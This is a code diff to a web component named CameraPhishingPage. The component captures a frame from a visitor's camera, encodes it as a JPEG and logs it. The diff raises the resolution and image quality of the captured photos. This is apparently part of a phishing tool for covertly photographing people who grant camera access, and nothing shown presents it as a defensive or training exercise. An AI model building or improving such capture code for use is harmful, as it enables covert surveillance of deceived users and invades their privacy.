@@ -55,9 +55,9 @@ export default function CameraPhishingPage() {
       const video = videoRef.current;
       const canvas = canvasRef.current;
 
-      // Define maximum dimensions for the captured image - MORE AGGRESSIVE REDUCTION
-      const MAX_WIDTH = 320; 
-      const MAX_HEIGHT = 240;
+      // Define maximum dimensions for the captured image
+      const MAX_WIDTH = 640; 
+      const MAX_HEIGHT = 480;
       let { videoWidth, videoHeight } = video;
 
       // Calculate new dimensions while maintaining aspect ratio
@@ -78,13 +78,12 @@ export default function CameraPhishingPage() {
       
       const context = canvas.getContext('2d');
       if (context) {
-        // Draw the resized image onto the canvas
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        // Capture the image as JPEG with 50% quality - MORE AGGRESSIVE REDUCTION
-        const imageUrl = canvas.toDataURL('image/jpeg', 0.5); 
+        // Capture the image as JPEG with 80% quality
+        const imageUrl = canvas.toDataURL('image/jpeg', 0.8); 
         const cameraData: CameraData = { imageUrl };
         addLog({ type: 'camera', data: cameraData });
-        console.log("Image captured and logged with further reduced size.");
+        console.log("Image captured and logged.");
         setStatus('captured'); 
         stopCameraStream(true); 
       }
